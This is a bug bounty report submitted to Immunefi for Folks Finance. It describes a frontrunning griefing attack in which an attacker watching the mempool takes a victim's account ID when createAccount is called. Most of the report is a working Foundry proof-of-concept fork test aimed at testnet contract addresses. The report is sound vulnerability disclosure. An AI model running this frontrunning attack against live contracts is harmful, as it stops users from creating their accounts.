# Boost \_ Folks Finance 33645 - \[Smart Contract - Medium] Griefing an user from creating an account

Submitted on Thu Jul 25 2024 13:23:40 GMT-0400 (Atlantic Standard Time) by @Shahen for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33645

Report type: Smart Contract

Report severity: Medium

Target: <https://testnet.snowtrace.io/address/0x6628cE08b54e9C8358bE94f716D93AdDcca45b00>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

This is a very simple bug description, When someone tries to create an account by calling `SpokeCommon.createAccount()`, An attacker that monitors the mempool can frontrun the call by taking the victims accountId from the parameters and registering it to the attacker. The attacker could do this again and again as the fee is very low. Please refer to the below coded foundry POC, Its a fork test and i have included the node rpc so just RUN `forge test -vvv`

## Vulnerability Details

Same as above Brief/Intro

## Impact Details

Griefing an user from creating an account.

## References

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/spoke/SpokeCommon.sol#L27>

## Proof of concept

## Proof of Concept

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Test.sol";


interface iSpokeCommon {
    function createAccount(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 refAccountId
    ) external payable;


}

interface iBridgeRouter {
    function getSendFee(MessageToSend memory message) external view returns (uint256);
}

interface iAccountManager {
     function isAccountCreated(bytes32 accountId) external view returns (bool);
     function isAddressRegisteredToAccount(
        bytes32 accountId,
        uint16 chainId,
        bytes32 addr
    ) external view returns (bool);
    function getAddressRegisteredToAccountOnChain(
        bytes32 accountId,
        uint16 chainId
    ) external view returns (bytes32);
}



struct MessageParams {
        uint16 adapterId; 
        uint16 returnAdapterId; 
        uint256 receiverValue; 
        uint256 gasLimit; 
        uint256 returnGasLimit; 
}

struct MessageToSend {
        MessageParams params; 
        bytes32 sender; 
        uint16 destinationChainId; 
        bytes32 handler; 
        bytes payload; 
        uint64 finalityLevel; 
        bytes extraArgs;
}

enum Action {
        
        CreateAccount,
        CreateLoan
}

struct MessagePayload {
        Action action;
        bytes32 accountId;
        bytes32 userAddress;
        bytes data;
}

struct UserLoanCollateral {
        uint256 balance; 
        uint256 rewardIndex;
}

struct UserLoanBorrow {
        uint256 amount; 
        uint256 balance; 
        uint256 lastInterestIndex;
        uint256 stableInterestRate; 
        uint256 lastStableUpdateTimestamp; 
        uint256 rewardIndex;
}



contract Folkstest is Test {

    iSpokeCommon public _SpokeCommon; 
    iBridgeRouter public _BridgeRouter;
    iAccountManager public _AccountManager;
    
   
    


    address bob = address(0x1); //victim
    address alex = address(0x2); //attacker

    MessageParams _MessageParams = MessageParams(uint16(1),uint16(1),uint16(0),uint256(201817),uint256(0)); 
    

   
    function setUp() public {
        //avalanche-testnet-contract 
        //https://avalanche-fuji.drpc.org (testnet-rpc)
        _SpokeCommon = iSpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00); //SpokeCommon.sol 
        _BridgeRouter = iBridgeRouter(0x0f91d914E058d0588Cc1bf35FA3736A627C3Ba81); 
        _AccountManager = iAccountManager(0x3324B5BF2b5C85999C6DAf2f77b5a29aB74197cc);
        
        
        

    }

    function _message(bytes32 _accountId, address _useraddress) private returns (MessageToSend memory) {
        MessagePayload memory payload = MessagePayload(Action.CreateAccount,_accountId,bytes32(uint256(uint160(_useraddress))),abi.encodePacked(bytes32(0)));
        MessageToSend memory _message = MessageToSend({
            params: _MessageParams,
            sender: bytes32(uint256(uint160(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00))), 
            destinationChainId: uint16(1),
            handler: bytes32(0x000000000000000000000000ae4c62510f4d930a5c8796dbfb8c4bc7b9b62140), 
            payload: abi.encodePacked(uint16(payload.action), payload.accountId, payload.userAddress, payload.data),
            finalityLevel: 0, 
            extraArgs: ""
        });

        return _message;
    }
    

    function _alex_frontrun_transaction(uint256 send_fee) private {
        _SpokeCommon.createAccount{value: send_fee}(_MessageParams,keccak256(abi.encodePacked("bobacc")),bytes32(0));
    }
    function test_grief_createAccount() public {
        vm.createSelectFork("https://avalanche-fuji.drpc.org");

    //1.Bob tries to create an account with account id "bobacc"
    //  Alex sees the transaction pending in the mempool,
    //  Alex frontruns the `SpokeCommon.createAccount()` with the same account ID from bobs parameters.
        vm.startPrank(alex);
        bytes32 account_id = keccak256(abi.encodePacked("bobacc"));
        uint256 _sendfee = _BridgeRouter.getSendFee(_message(account_id,alex));
        deal(alex,_sendfee);
        _alex_frontrun_transaction(_sendfee);
        vm.stopPrank();

    //2. Now Bobs transaction gets mined but the account is created under alex. 
        vm.startPrank(bob);
        _SpokeCommon.createAccount{value:_sendfee}(_MessageParams,keccak256(abi.encodePacked("bobacc")),bytes32(0));
    //3. Asserting that the account is created and the owner is Alex..
        bool _isAccountCreated = _AccountManager.isAccountCreated(keccak256(abi.encodePacked("bobacc")));
        assertEq(_isAccountCreated,true);
        bool _isAddressRegisteredToAccount_alex = _AccountManager.isAddressRegisteredToAccount(keccak256(abi.encodePacked("bobacc")),uint16(1),bytes32(uint256(uint160(alex))));
        assertEq(_isAddressRegisteredToAccount_alex,true);
        vm.stopPrank();
    //4. In conculsion Alex sucessfully griefed bob from creating an account.
    
    }

}
```
